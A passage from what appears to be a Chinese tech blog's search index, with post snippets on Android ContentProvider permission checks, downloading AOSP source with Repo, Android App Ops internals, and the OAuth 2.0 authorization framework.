的检查： 根据接口类型检查调用者是否满足目标组件声明的 readPermission 或 writePermission 权限，同时检查权限关联的 AppOps，只有权限显式满足（权限非空且调用者满足要求）才检查成功。否则执行下一步的 Path 权限检查。 注：这和文档中 Path优先于组件（「Also, path-level permission takes precedence over provider-level permissions.」） 描述有所差异（解释：这句话的意思应该是如果 provider 组件 level 的权限是不满足时，path 权限此时才优先生效），如果 provider 组件级的权限已经满足，就不再检查 path 权限 查询调用者要访问的 URI 对应匹配的目标组件 Path，检查其声明的 readPermission 或 writePermission 权限以及权限关联的 AppOps：如果匹配的 Path 声明了指定的权限，调用者显式满足权限声明要求，返回检查成功如果 URI 没有匹配任何 Path 或匹配但 Path 声明的权限为空，并且第 3 步组件级权限也为空，这说明目标 CP 是无任何权限限制的公开组件，此时也返回检查成功。否则进入下一步检查，看看还有没有机会。 到现在还是不通过？没关系，还有最后一次机会，检查调用者是否被动态授予了目标 URI 权限 注：当 URI 对应的 ContentProvider exported = true 时 Context.checkUriPermission 方法始终返回 true。 从代码看前两步时调用 checkPermissionAndAppOp 来实现的，展开分析这个方法： /** * Verify that calling app holds both the given permission and any app-op * associated with that permission. */ private int checkPermissionAndAppOp(String permission, String callingPkg, IBinder callerToken) { if (getContext().checkPermission(permission, Binder.getCallingPid(), Binder.getCallingUid(), callerToken) != PERMISSION_GRANTED) { return MODE_ERRORED; } return mTransport.noteProxyOp(callingPkg, AppOpsManager.permissionToOpCode(permission)); }观察 checkPermissionAndAppOp 方法，可以发现分别调用 Context.checkPermission() 和 AppOpsManager.noteProxyOp()，并要求二者同时满足要求。（由此应证，Context.checkPermission 只检查 permission 而不检查 AppOps） /** * Verify that calling app holds both the given permission and any app-op * associated with that permission. */ private int checkPermissionAndAppOp(String permission, String callingPkg, IBinder callerToken) { if (getContext().checkPermission(permission, Binder.getCallingPid(), Binder.getCallingUid(), callerToken) != PERMISSION_GRANTED) { return MODE_ERRORED; } return mTransport.noteProxyOp(callingPkg, AppOpsManager.permissionToOpCode(permission)); }Context.checkPermission() 这里不细说，就是进入 AMS/PMS 来执行传统的「权限」检查。重点说下 noteProxyOp()。noteProxyOp 的最终实现在 AppOpsService.java，AppOpsService 是运行在 system_server 中的一个系统服务，noteProxy() 会检查 permission 关联的 op 是否被允许。这里 ContentProvider 调用的是 noteProxyOp() 而不是 noteOp()，因此要求 proxy 方（Content Provider 提供方）和 proxied 方（Content Provider 调用方）方同时满足 op 要求。详细内容参考 AppOpsService。注：exported 的默认值，API 17 即以后是 true，在此之前是没有这个属性的，所以默认行为等价于是 true。参见authorities在清单文件 Content Provider 元素中类名（name）仅标识实现类，而 authorities 才是唯一标识（因此，不同应用定义相同 authorities 会导致冲突，而无法安装）。实现类通过 addURI 方法向指定 authorities 添加 path （组合形成 URI）和对应处理代码、或 FileProvider 的 getUriForFile 来向指定 authorities 添加 URI （文件资源）" }, { "title": "使用 Repo 下载 AOSP 源代码", "url": "/posts/aosp-repo-guide/", "categories": "Android", "tags": "", "date": "2020-11-12 00:00:00 +0800", "snippet": "本指导记录了在 Windows 下（除了安装外，其余章节 Linux 同样适用）使用 Repo 工具的过程，包括安装 Repo、配置代理、同步全部或部分 Android Open Source Project（APPS）工程源代码到本地，可方便 Android 系统研究人员后续使用 Source Insight 等工具本地查阅代码。安装 Repo（Windows）安装 Pythonrepo 是 Python 脚本，依赖于 Python。前往 https://www.python.org/downloads/ 下载安装 Python 3，安装过程注意勾选创建 PATH 环境变量，使 Python 程序目录添加到操作系统环境变量中。安装 Git前往 https://git-scm.com/downloads 下载安装 Git，在 Windows 上 Git 还提供了一个 bash 模拟器，称为 Git Bash。安装 Repo先在用户目录（%USERPROFILE%）下创建 bin 目录，然后手动下载 https://storage.googleapis.com/git-repo-downloads/repo 到该目录，最后将 bin 目录添加到 Windows PATH 环境变量中。配置代理（可选）在公司内网，可能需要额外配置代理才能让 git 和 repo 连接外网。Git 代理配置编辑 %USERPROFILE%/.gitconfig（Windows）或 ~/.gitconfig（Linux）[http] proxy = http://user:password@example.com:8080[https］ proxy = http://user:password@example.com:8080注意：连接内网地址时需要关闭代理。Repo 代理配置编辑 %USERPROFILE%/.bash_profile（Windows）或 ~/.bash_profile（Linux），增加如下代理配置：export http_proxy=http://user:password@example.com:8080export https_proxy=$http_proxyexport ftp_proxy=$http_proxy完成上述代理配置后，bash（或 git bash）中运行的 Git 和 Repo 命令就会以代理的方式连接服务器了。创建 AOSP 源代码根目录mkdir AOSP在源代码根目录初始化 Repo 客户端在源码根目录执行 repo init 获取最新版本的 Repo，并通过指定清单文件来指定 Android 源代码中包含的各个代码库位于工作目录中的什么位置：repo init -u https://android.googlesource.com/platform/manifest上面命令会在 AOSP 目录创建 .repo 目录，包含最新版本 Repo 以及清单等文件。如果因不明原因无法下载 Repo，可以用如下命令手动获取：mkdir .repocd .repogit clone https://gerrit.googlesource.com/git-repomv git-repo repo同步源代码AOSP 由大量项目组成，包含数百个 git 仓库，代码量十分巨大（因此 Google 开发 repo 工具）。同步源代码的方式有两种：同步整个 AOSP 源代码repo sync同步 AOSP 子工程源代码通过指定工程名来来执行 repo sync，可以仅仅同步感兴趣的那部分源代码，并且在本地保持 AOSP 目录结构：repo sync project_name1 projuect_nameN其中工程名可通过查阅 .repo/manifest/default.xml 得到，例如 platform/frameworks/base切换不同 AOSP 分支1. 查看可切换的分支cd .repo/manifests git branch -a | cut -d / -f 32. 切换分支 (以android-7.0.0_r1为例)repo init -u https://android.googlesource.com/platform/manifest -b android-7.0.0_r13. 同步代码repo sync如果本地版本库中的源代码有一些改动，执行上述命令后，会出现部分文件的提交无法合并的提示，此时使用下面的操作命令：repo forall -c git reset --hardrepo init -u https://android.googlesource.com/platform/manifest -b android-7.0.0_r1repo sync下载 Android Kernel 代码Android Kernel 并不包含在 AOSP 中，需要单独下载。根据官方链接 ，不同设备类型有不同的 kernel，有的 kernel 包含不止一个仓库，但有的 kernel （例如 common kernel，通用内核）则只有一个仓库，因此需要用 repo 工具来保证拉取到正确的仓库。因此只拉取通用 kernel 的话，直接 git clone 即可：git clone https://android.googlesource.com/kernel/common注意：Windows 系统会报 error: invalid path &#39;include/soc/arc/aux.h&#39; 的错误，原因是 Windows 文件系统不支持 aux 这个文件名，解决办法：前往 https://github.com/aosp-mirror/kernel_common 直接下载 zip其他 kernel 的下载指令，请参考官方链接。常见问题 添加了环境变量，但 Git Bash 仍然报找不到 Python 的错误（Windows）/bin/env: python: No such file or directory这种情况在 Git Bash 中执行 echo $PATH 会发现 Python 不在 PATH 变量中，解决办法是重启电脑以及重装 Git，让 Git 重新读取 Windows 的环境变量。 如果 Git Bash 执行 repo init 出现 PermissionError 的错误，以管理员身份运行即可" }, { "title": "理解 App Ops", "url": "/posts/app-ops/", "categories": "Android", "tags": "", "date": "2020-08-26 00:00:00 +0800", "snippet": "概述根据 Google 的文档，从 Android 4.3 开始，Android 应用框架引入了 App Ops。App Ops 涵盖了广泛的功能，被用于访问控制和跟踪，帮助运行时权限访问控制和跟踪到电池消耗。也就是说 App Ops 也被用于安全用途，具体而言：新的权限模型由传统 permission 和 App Ops 共同组成，一些权限会额外关联 op，例如 android.permission.ACCESS_FINE_LOCATION permission 就关联了 OPSTR_FINE_LOCATION 这个 App Ops，但并非所有 permission 都有对应的 op。只有 permission 额外关联的 App Ops 同时满足时，接口才允许被应用调用。App Ops 功能的核心实现由运行在 system_server 进程中的 AppOpsService 服务提供。AppOpsService 类包含有两个主要的方法 noteOperation 和 noteProxyOperation，用于检查&amp;amp;记录应用的 Op。从方法名看，由于会「记录」（note），因此后面读代码会发现这两个方法都有相应的调用认证鉴权机制。OPop 是 operation 的缩写，定义应用的”行为/动作“，是 AppOpsService operation 访问控制的行动单位。在 AppOpsManager.java 中可以看到完整的 op 定义。截取部分 op 常量即对应的值展示： // when adding one of these: // - increment _NUM_OP // - define an OPSTR_* constant (marked as @SystemApi) // - add rows to sOpToSwitch, sOpToString, sOpNames, sOpToPerms, sOpDefault // - add descriptive strings to Settings/res/values/arrays.xml // - add the op to the appropriate template in AppOpsState.OpsTemplate (settings app) /** @hide No operation specified. */ @UnsupportedAppUsage public static final int OP_NONE = -1; /** @hide Access to coarse location information. */ @TestApi public static final int OP_COARSE_LOCATION = 0; /** @hide Access to fine location information. */ @UnsupportedAppUsage public static final int OP_FINE_LOCATION = 1; /** @hide Causing GPS to run. */ @UnsupportedAppUsage public static final int OP_GPS = 2;通常每个 op 都对应一个 permission，这在 sOpPerms 常量中记录，并可使用 opToPermission(int op) 方法获取： /** * This optionally maps a permission to an operation. If there * is no permission associated with an operation, it is null. */ @UnsupportedAppUsage private static String[] sOpPerms = new String[] { android.Manifest.permission.ACCESS_COARSE_LOCATION, android.Manifest.permission.ACCESS_FINE_LOCATION, null, android.Manifest.permission.VIBRATE,通过 op 的值查询对应上面的数组位置可见 ACCESS_COARSE_LOCATION，ACCESS_FINE_LOCATION 这两个 permission 对应的 op 分别是 OP_COARSE_LOCATION（0），OP_FINE_LOCATION（1） 。但要注意并非每个权限都对应有 op，反之依然。此外，还有一个数组 sOpToSwitch 需要额外注意，它定义了每个 op 对应的 switch code，并使用 opToSwitch(int op) 转换 op 为 switch。而从后面的代码实现可以发现，实际控制 operation 的是 switch code 而非 op code，因此 switch code 可以理解为精简版的 op code。摘录部分 sOpToSwitch 如下： /** * This maps each operation to the operation that serves as the * switch to determine whether it is allowed. Generally this is * a 1:1 mapping, but for some things (like location) that have * multiple low-level operations being tracked that should be * presented to the user as one switch then this can be used to * make them all controlled by the same single operation. */ private static int[] sOpToSwitch = new int[] { OP_COARSE_LOCATION, // COARSE_LOCATION OP_COARSE_LOCATION, // FINE_LOCATION OP_COARSE_LOCATION, // GPS OP_VIBRATE, // VIBRATE通过 op 的值查询 sOpToSwitch 数组可以发现，OP_COARSE_LOCATION，OP_FINE_LOCATION，OP_GPS 三个 op 转换为 switch code 后均为 OP_COARSE_LOCATION，即值为 0，这说明 ACCESS_COARSE_LOCATION，ACCESS_FINE_LOCATION 这两个 permission 都使用 OP_COARSE_LOCATION 这个 op 来控制。记住这一点可以用于后续解释 Android 校验 op 的行为。延伸分析：在 permissionToOpCode 还可以看到一段值得注意的注释 /** * Retrieve the app op code for a permission, or null if there is not one. * This API is intended to be used for mapping runtime or appop permissions * to the corresponding app op. * @hide */ @TestApi public static int permissionToOpCode(String permission) { Integer boxedOpCode = sPermToOp.get(permission); return boxedOpCode != null ? boxedOpCode : OP_NONE; }按此注释， permission 还进一步分为 runtime permission 和 appop permission，并且在 RUNTIME_AND_APPOP_PERMISSIONS_OPS 罗列了二者分别对应的 op // APPOP PERMISSIONS OP_ACCESS_NOTIFICATIONS, OP_SYSTEM_ALERT_WINDOW, OP_WRITE_SETTINGS, OP_REQUEST_INSTALL_PACKAGES, OP_START_FOREGROUND, OP_SMS_FINANCIAL_TRANSACTIONS,查询 sOpPerms 可以发现分别对应以下 appop permission：android.Manifest.permission.ACCESS_NOTIFICATIONSandroid.Manifest.permission.SYSTEM_ALERT_WINDOWandroid.Manifest.permission.WRITE_SETTINGSManifest.permission.REQUEST_INSTALL_PACKAGESManifest.permission.FOREGROUND_SERVICEManifest.permission.SMS_FINANCIAL_TRANSACTIONS其中的 android.Manifest.permission.ACCESS_NOTIFICATIONS 在 Manifest.permission 查找不到，应是 Android 系统内部使用而非面向应用开发者的权限。有理由猜测 appop Permission 完全由 AppOpsService 实现的“权限”，区别于 AMS/PMS 实现的传统 Permission。OP ModeOP Mode 表示该 OP 的访问控制模式，同时也是 noteOperation，noteProxyOperation 等方法的返回值AppOpsManager 定义了多种 Mode，包括 MODE_ALLOWED（0）允许给定的调用者执行目标 operation MODE_IGNORED（1）不允许给定的调用者行目标 operation，但会静默失败（不应导致应用崩溃），…noThrow 类方法的返回值。实现层面一般是不执行请求的操作（不执行回调）或不返回任何数据或伪数据。 MODE_ERRORED （2）不允许给定的调用方执行目标 operation，并且此意图应导致它出现致命错误，通常是 SecurityException。 MODE_DEFAULT （3）调用者应使用自己默认的安全检查。这个模式很少使用，仅在 appop permission 场景使用，并且调用者必须显式检查并处理它。noteOperationnoteOperation 和 noteProxyOperation 应当差不多，主要的差异应是 noteOperation 适用于非代理场景，因此只记录/检查目标 UID/PackageName 的 op，而不需要像 noteProxyOperation() 同时检查/记录代理方和被代理方。另外，需要注意，由于会调用 verifyIncomingUid() 校验 UID 的合法性，该方法只允许应用记录/检查自己的 op，如果要跨应用记录/检查，必须获取 UPDATE_APP_OPS_STATS 特权AppOpsService.java @Override public int noteOperation(int code, int uid, String packageName) { verifyIncomingUid(uid); verifyIncomingOp(code); String resolvedPackageName = resolvePackageName(uid, packageName); if (resolvedPackageName == null) { return AppOpsManager.MODE_IGNORED; } return noteOperationUnchecked(code, uid, resolvedPackageName, 0, null); }noteProxyOperation记录一个应用程序在处理 IPC 时代表另一个应用程序执行操作的过程。此函数将验证调用者（代理方） uid 和代理方包名称是否匹配，如果不匹配，则返回MODE_IGNORED。如果此调用成功，则代理应用程序和您的应用程序的操作的最后执行时间将更新为当前时间。代理方调用，用以检查被代理方的 op以 Android 10 的实现为例 public int noteProxyOperation(int code, int proxyUid, String proxyPackageName, int proxiedUid, String proxiedPackageName) { verifyIncomingUid(proxyUid); verifyIncomingOp(code); String resolveProxyPackageName = resolvePackageName(proxyUid, proxyPackageName); if (resolveProxyPackageName == null) { return AppOpsManager.MODE_IGNORED; } final boolean isProxyTrusted = mContext.checkPermission( Manifest.permission.UPDATE_APP_OPS_STATS, -1, proxyUid) == PackageManager.PERMISSION_GRANTED; final int proxyFlags = isProxyTrusted ? AppOpsManager.OP_FLAG_TRUSTED_PROXY : AppOpsManager.OP_FLAG_UNTRUSTED_PROXY; final int proxyMode = noteOperationUnchecked(code, proxyUid, resolveProxyPackageName, Process.INVALID_UID, null, proxyFlags); if (proxyMode != AppOpsManager.MODE_ALLOWED || Binder.getCallingUid() == proxiedUid) { return proxyMode; } String resolveProxiedPackageName = resolvePackageName(proxiedUid, proxiedPackageName); if (resolveProxiedPackageName == null) { return AppOpsManager.MODE_IGNORED; } final int proxiedFlags = isProxyTrusted ? AppOpsManager.OP_FLAG_TRUSTED_PROXIED : AppOpsManager.OP_FLAG_UNTRUSTED_PROXIED; return noteOperationUnchecked(code, proxiedUid, resolveProxiedPackageName, proxyUid, resolveProxyPackageName, proxiedFlags); }其中入参 proxyXXX 是代理方（服务提供方）、proxiedXXX 是被代理方（调用服务的客户端）该方法先执行访问控制，校验 proxyUid 的合法性（只允许应用创建 proxyUid 为自己 UID 的 op 记录，除非具有 UPDATE_APP_OPS_STATS 特权，才能跨应用记录），包括： verifyIncomingUid()：使用 Binder.getCallingUid 认证代理方 UID，要求等于调用 AppOpsService 者的 UID，否则检查调用者是否具有 UPDATE_APP_OPS_STATS 权限，该权限要求系统平台签名。也就是说某个 proxyUid 的记录只能由该 UID 对应的应用自己 note，除非具有特权。注：从代码看，校验并没有检查 proxyUid 和 proxyPackageName 的匹配关系（也许在其它地方有校验），也没有对 proxiedUid/proxiedPackageName 做任何校验。然后分别调用 noteOperationUnchecked() 检查（记录）代理方和被代理方的 app op，当代理方和被代理的 op mode 均为 MODE_ALLOWED 时，noteProxyOperation() 才返回 MODE_ALLOWED，任何一方 op 失败都会导致失败。noteOperationUnchecked() 的具体实现不进一步展开描述，总体而言就是先查询 uid/packageName 对应记录的 op，然根据该 op 的 mode（MODE_ALLOWED 等）在 /data/system/appops.xml 创建对应记录，最后返回 mode 供调用方使用。值得注意其中一行代码final int switchCode = AppOpsManager.opToSwitch(code);可以发现 op code 实际上会转换成 switch code 来最终执行访问控制。参考 OP 章节有关 switch code 的描述。最后，noteProxyOperation() 调用者（代理方）需要根据返回的 mode 决定是否允许这次 operation 代理。App Op 在系统中的记录AppOpsService 在 /data/system/appops.xml 中记录各个应用的 op 状态和执行情况。&amp;lt;uid&amp;gt; 标签记录&amp;lt;uid&amp;gt; 标签记录指定应用各个 op 的状态模式，例如在 Android 10.0 某 UID 为 10113（com.example.service）记录如下：&amp;lt;uid n=&quot;10115&quot;&amp;gt;&amp;lt;op n=&quot;0&quot; m=&quot;1&quot; /&amp;gt;&amp;lt;/uid&amp;gt;其中 &amp;lt;op n=&quot;0&quot; m=&quot;1&quot; /&amp;gt; 表示一条 op 状态记录，n=&quot;0&quot; 代表 op 的值，通过查阅代码可知对应 OP_COARSE_LOCATION ，m=1 表示该 op 的 mode 为 MODE_IGNORED检查该应用的权限声明，如下&amp;lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; package=&quot;com.example.aidlservice&quot;&amp;gt; &amp;lt;uses-permission android:name=&quot;android.permission.ACCESS_FINE_LOCATION&quot; /&amp;gt; &amp;lt;uses-permission android:name=&quot;android.permission.ACCESS_COARSE_LOCATION&quot; /&amp;gt;当拒绝 Location 权限（”Deny“，默认情况）时对应的 op 状态：&amp;lt;op n=&quot;0&quot; m=&quot;1&quot; /&amp;gt;注：这里 ACCESS_FINE_LOCATION、ACCESS_COARSE_LOCATION 是两个不同的权限却对应只有一条 OP_COARSE_LOCATION 记录，是因为一些权限使用同一个 op 来控制，参考 OP 章节有关 switch code 的描述当通过应用详情设置页面将 Location 权限切换为 ”Allow only while using the app“ (Android 10 专有) 时对应的 op 状态为：&amp;lt;op n=&quot;0&quot; m=&quot;4&quot; /&amp;gt;这里 mode 4 是 Android 10 新引入的 MODE_FOREGROUND /** * Special mode that means &quot;allow only when app is in foreground.&quot; This is &amp;lt;b&amp;gt;not&amp;lt;/b&amp;gt; * returned from {@link #unsafeCheckOp}, {@link #noteOp}, {@link #startOp}. Rather, * {@link #unsafeCheckOp} will always return {@link #MODE_ALLOWED} (because it is always * possible for it to be ultimately allowed, depending on the app&#39;s background state), * and {@link #noteOp} and {@link #startOp} will return {@link #MODE_ALLOWED} when the app * being checked is currently in the foreground, otherwise {@link #MODE_IGNORED}. * * &amp;lt;p&amp;gt;The only place you will this normally see this value is through * {@link #unsafeCheckOpRaw}, which returns the actual raw mode of the op. Note that because * you can&#39;t know the current state of the app being checked (and it can change at any * point), you can only treat the result here as an indication that it will vary between * {@link #MODE_ALLOWED} and {@link #MODE_IGNORED} depending on changes in the background * state of the app. You thus must always use {@link #noteOp} or {@link #startOp} to do * the actual check for access to the op.&amp;lt;/p&amp;gt; */ public static final int MODE_FOREGROUND = 4;&amp;lt;pkg&amp;gt; 标签记录&amp;lt;pkg&amp;gt; 标签记录指定包名应用 op 的执行情况，即 op 执行日志，如下所示&amp;lt;pkg n=&quot;com.example.service&quot;&amp;gt;&amp;lt;uid n=&quot;10115&quot; p=&quot;false&quot;&amp;gt;&amp;lt;op n=&quot;1&quot;&amp;gt;&amp;lt;st n=&quot;429496729604&quot; t=&quot;1598412052901&quot; r=&quot;1598412012847&quot; /&amp;gt;&amp;lt;st n=&quot;1073741824004&quot; r=&quot;1598411996821&quot; /&amp;gt;&amp;lt;/op&amp;gt;&amp;lt;/uid&amp;gt;&amp;lt;/pkg&amp;gt;可以看到值为 1 的 op（OP_FINE_LOCATION ）有两条记录，其中 n 是索引键值， t 表示访问时间戳，r 表示拒绝时间戳关于日志格式定义，参考 AppOpsService.writeState" }, { "title": "深入理解 OAuth 2.0", "url": "/posts/dive-into-oauth2/", "categories": "Web", "tags": "OAuth 2.0", "date": "2020-03-16 00:00:00 +0800", "snippet": "OAuth 2.0 RFC（The OAuth 2.0 Authorization Framework）篇幅很长、内容详实，覆盖了包括原理概念、工作流程、报文格式、安全性、拓展性等等诸多方面，直接阅读十分不易。因此，本文结合博主的背景知识，提取、翻译规范主干内容并深入解读 OAuth 2.0，意图帮助读者避免一开始就陷入 RFC 的繁枝末节中。概念介绍在传统的客户端/服务器（client-server）认证模型中，客户端直接使用 resource owner（资源所有者）的凭据（credentials，例如账户和口令）来请求访问服务器上的 protected resource（受保护资源）。在这种模型下，想要提供第三方访问 protected resource 的 能力，resource orwner 就需要将其凭证分享给第三方。这就引入一些问题与局限： 第三方应用（third-party application）需要存储 resource owner 的凭据以供后续使用，通常会是明文的口令。 服务器需要支持口令认证，尽管这种认证方式有固有的弱点。 第三方应用能够访问 resource owner 过于广泛的受保护资源，而 resource owner 缺乏任何限制能力，包括限制访问的时间周期、范围。（解读：这是因为用于认证 resource owner 身份的原始凭证已经泄露给三方了） resource owner 无法吊销特定三方的访问，而只能撤销所有三方的访问权限，而且要做的这点，必须通过修改密码的方式。 任何一个第三方应用的失陷（compromise）都会造成最终用户的口令泄露，也即意味着所有受此口令保护的资源将沦陷。解读：传统授权模型具有上述缺陷的根本原因在于 client 和 resource owner 之间没有区分开：当 client 获取到原始授权凭据后，它实际就成为了 resource owner。OAuth 2.0 授权框架通过在 client 和 resource owner 之间引入一个 authorization layer（这是一个抽象的层，abstraction layer）并将角色 client 从 resource owner 中分离来解决上述问题：client 不再使用 resource owner 自身的凭据来访问 resource owner 控制的、由 resource server 托管的 resource。client 不使用 resource owner 自身凭据来访问资源，而是使用 access token —— 一个可以表示访问的范围，生命周期，及其他属性的字符串。access token 在 resource owner 的同意下由 authorization server 颁布给第三方客户端（client），接着 client 用 access token 来访问托管于 resource server 的受保护资源。举例来说：一个最终用户（resource owner) 可以授权某个打印机服务（client）访问她存储于照片分享服务提供者（resource server）上的受保护照片，而不用和打印机服务分享她自己的用户名和口令。取代之的是，她直接向照片分享服务提供者信任的服务器认证（authorization server），然后服务器向打印机服务发布委托专用（delegation-specific）凭据（access token）。解读：「委托专用」意味该凭据只能用于委派访问场景，而不可用于其他的，如认证场景。传统认证授权模式下客户端直接使用用户「身份」，即使后续不保存用户的凭证（账户和口令），也使用了 token、session ID 等身份认证凭据。这是两种模式的本质区别，也是「授权」和「认证」的区别。角色OAuth 2.0 授权模型定义了四种角色 resource owner资源所有者，是能够授予受保护资源访问权的实体。特别地，当资源所有者是一个人时，称之为 end-user（最终用户） resource server资源服务器，托管受保护资源的服务器，能勾接收和响应受保护资源请求（通过 access token） client客户端，一个在 resource owner 的授权下代其请求受保护资源的应用。RFC6749 特别指明「client」这一术语没有任何具体技术实现的约束，所以不论是在服务器、桌面平台还是终端设备上运行的各类程序，都是可以的。 authorization server授权服务器，在成功认证 resource owner 并获其授权（authorization）后颁发 access token 的服务器OAuth 2.0 也没有规定 authorization server 和 resource server 之间应该如何交互：根据不同的实现，二者可以同时部署在一个服务器上，也可以分属于不同的实体。而且，单个 authorization server 也可能签发被多个 resource server 接受的 access token。Protocol Flow +--------+ +---------------+ | |--(A)- Authorization Request -&amp;gt;| Resource | | | | Owner | | |&amp;lt;-(B)-- Authorization Grant ---| | | | +---------------+ | | | | +---------------+ | |--(C)-- Authorization Grant --&amp;gt;| Authorization | | Client | | Server | | |&amp;lt;-(D)----- Access Token -------| | | | +---------------+ | | | | +---------------+ | |--(E)----- Access Token ------&amp;gt;| Resource | | | | Server | | |&amp;lt;-(F)--- Protected Resource ---| | +--------+ +---------------+ 图 1：逻辑工作流程OAuth 2.0 定义了多种工作模式以应用不同场景，但逻辑上它们的工作流程可以统一地抽象为上图，此图描述了各角色间如何交互：(A) client 请求来自 resource owner 的授权。授权请求可以直接地发往 resource owner（正如图中所示），也可以间接地通过 authorization server 作为中介来处理。(B) client 获得 resource owner 的授权许可（authorization grant）。这里许可模式（grant type）取决于 client 请求中的参数以及 authorization server 侧是否支持，可以是 RFC 中定义的四种之一，也可以是自定义扩展方式。详见后文。注解：在不同工作模式下，resource owner 可以使用其凭证直接响应 client 的访问请求（这将暴露其凭证给 client 所属的第三方或所在的应用程序环境），也可以转而在独立的 authorization server （即所谓的抽象授权层）处处理访问请求。显然，这两种方式有着不同的安全等级。(C) client 向 authorization server 认证自己的身份并展示（resource owner 的） 授权许可，以获取 access token。(D) authorization server 认证 client 并校验授权许可，如果合法，颁发 access token。(E) client 展示 access token 来认证，请求访问 resource server 上的受保护资源(F) resource server 校验 access token ，如果合法，正常响应资源请求Authorization Grantauthorization grant （授权许可），是一个代表 resource owner 对受保护资源进行了授权的凭据，被 client 使用来获取访问资源的 access token。OAuth 2.0 定义了四种类型（type）的 authorization grant，包括：authorization code、implicit、resource owner password credentials 和 client credentials。字面上看，它们的区别在于有的直接使用 resource owner 的账户口令来授权，有的采用间接方式授权，而有的只用 client 身份即可获得访问授权。此外，OAuth 2.0 还支持扩展的许可类型，受限篇幅本文不做介绍。回顾逻辑工作流图可以看到，authorization grant 被用于 (B)、(C) 两个步骤，实际工作流中则分别对应有四种「flow」。其中有些工作流程简单、有些相对复杂，有些具有 OAuth 2.0 全部安全属性而有些则安全性欠佳。这部分内容在章节「四种授权模式及工作流」会详细展开介绍。Access Tokenaccess token 是访问受保护资源的凭据，是一段颁布给 client、代表授权的字符串。具体而言，token 表达了 resource owner 授予访问的特定范围（scope）、持续时间，并且由 resource server 和 authorization server 落实前述限制。通常，access token 字符串（的含义）对 client 不透明。有两种类型的 token 实现：1. 作为授权信息的索引，以获取实际的授权信息；2. 自包含（self-contain）授权信息，并且可执行校验，例如一串包含数据和数字签名的字符串（一个典型的例子是 JSON Web Token，缩写 JWT）。实践中，client 使用 access token 可能还需要其他认证凭据，这点不在 OAuth 2.0 规范范围内。前文提到 OAuth 2.0 引入了一个授权抽象层，access token 就是实现抽象的关键措施：它替换了原有的授权结构，相比用户名、密码等传统授权方式，使用 access token 授权可以实行更多的约束机制（原文：「This abstraction enables issuing access tokens more restrictive than the authorization grant used to obtain them」）。另外，这使得授权协议更加简洁：resource server 只需理解 access token ，而不需要理解各式各样的认证方式。access token 可以有不同的格式、结构、以及采取的措施（例如密码学属性），取决于服务端的安全需求。access token 具备哪些属性、如何用它来访问受保护资源方法的定义超出了本规范的范畴，在多个配套的 RFC 定义：如 The OAuth 2.0 Authorization Framework: Bearer Token Usage - RFC6450 定义了 目前 OAuth 2.0 主流使用 access token 的方式（称之为 Bearer Token），包括定义 HTTP 报文格式等，Bearer Token 的格式在这个规范中依然没有定义，可以是简短的字符串，也可以是 JWT）；OAuth 2.0 Token Introspection - RFC 7662 则定义了一个协议，包括 access token 的属性规格（例如有效性，允许的 scope 上下文等）以及 resource owner 如何与 authorization server 通信来获取 access token 的属性信息。Refresh Tokenrefresh token 是获取 access token 的凭据。refresh token 由 authorization server 颁布给 client，用于获取新的 access token ——当前的 access token 已失效或过期、为了获取额外的 scope 等价或收窄的 access token（access token 可能具有更短的生命周期和更少的用户授权）。是否签发 refresh token 取决于 authorization server 的权衡，如果签发，将随 access token 一同发布（如图 1 的 (D) 步骤）同样，refresh token 也是一段代表 resource owner 对 client 授权的字符串，且该字符串也是对 client 不透明。token 是授权信息的标识（索引），以供检索授权信息。与 access token 不同，refresh token 仅适用于 authorization server，而且绝不会发送给 resource server。 +--------+ +---------------+ | |--(A)------- Authorization Grant ---------&amp;gt;| | | | | | | |&amp;lt;-(B)----------- Access Token -------------| | | | &amp;amp; refresh token | | | | | | | | +----------+ | | | |--(C)---- Access Token ----&amp;gt;| | | | | | | | | | | |&amp;lt;-(D)- Protected Resource --| Resource | | Authorization | | Client | | Server | | Server | | |--(E)---- Access Token ----&amp;gt;| | | | | | | | | | | |&amp;lt;-(F)- Invalid Token Error -| | | | | | +----------+ | | | | | | | |--(G)----------- refresh token -----------&amp;gt;| | | | | | | |&amp;lt;-(H)----------- Access Token -------------| | +--------+ &amp;amp; Optional refresh token +---------------+ 图 2：刷新过期的 Access Token图 2 所示的 access token 刷新流程包括以下步骤:(A) client 使 resouce owner 的 authorization grant 作为认证，向 authorization server 请求 access token(B) authorization server 认证 client 并校验 authorization grant，如果合法，签发 access token 和 refresh token。(C) client 使用 access token 向 resource server 请求访问受保护资源(D) resource server 校验 access token ，如果合法，服务本次请求。(E) 重复步骤 (C) 和 (D) 直到 access token 过期。如果 client 发现 access token 过期，跳到步骤 (G)；否则发起下一次受保护资源请求(F) 由于 access token 非法，resource server 返回一个 token 无效的错误(G) client 向 authorization server 认证身份并使用 refresh token 申请一个新的 access token 。client 认证要求取决于client的类型以及 authorization server 的策略。(H) authorization server 认证 client 并校验 refresh token，如果合法，签发一个新的 access token （可选地，一个新的 refresh token）。步骤 (C)，(D)，(E)， 和 (F) 的实现细节超出了 OAuth 2.0 规范的范畴、注：规范对 refresh token 在不同工作模式的约束如下 工作模式 Refresh Token code 可选 implicit 禁用 password 可选 client 不应该使用 ClientClient Registration接入 OAuth 2.0 协议之前，要向 authorization server 注册 client，使 authorization server 能提前获知 clients 的信息以做更细粒度的访问控制，至于通过何种渠道注册并不在规范范畴内定义，通常情况是用户在 HTML 表单中提交注册操作。而注册的内容，OAuth 2.0 认为应该包括： 指定 client type，正如本文下一节 「Client Type」 所述的 提供 client 的 redirection URI重定向 URI 是标识可以接受响应的一个地址，无论是 client、user-agent 还是 authorization server，都会使用这种地址跳转技术来发送或接受消息，这种行为类似于软件开放中的 callback：请求者留下一个重定向地址，响应者则通过这一地址发送准备好的响应。在 OAuth 2.0 你将多次看到它。详细内容参考 rfc6749#section-3.1.2根据规范。除了 authorization code 工作流步骤 (D) 里的重定向 URI 是 client 请求时必须提供的参数外，在其他请求里都是可选的——若注册时提供了重定向 URI，则请求里的重定向 URI 必须与注册时一致。后面会提到其中的安全考虑。 authorization server 要求的任何其他信息，如应用名称、网站地址、描述、logo 图片和接受的法律条款等等Client Type and Client AuthenticationOAuth 2.0 身份信息是否机密两种类型的 client confidential client具备安全地保管客户端凭证的能力的 client ，例如由安全服务器实现的程序。一个 client 是 confidential 的，意味着 authorization server 出于安全需求，会（且必须）对 client 执行满足其安全要求的认证措施，而 client 用于认证的身份凭证可以是口令、公私钥对等等。你可能会问，为什么要对 client 进行认证，有什么好处？ 将签发给 client 的 refresh token 和 authorization code 和 client 绑定起来（只能被相应 client 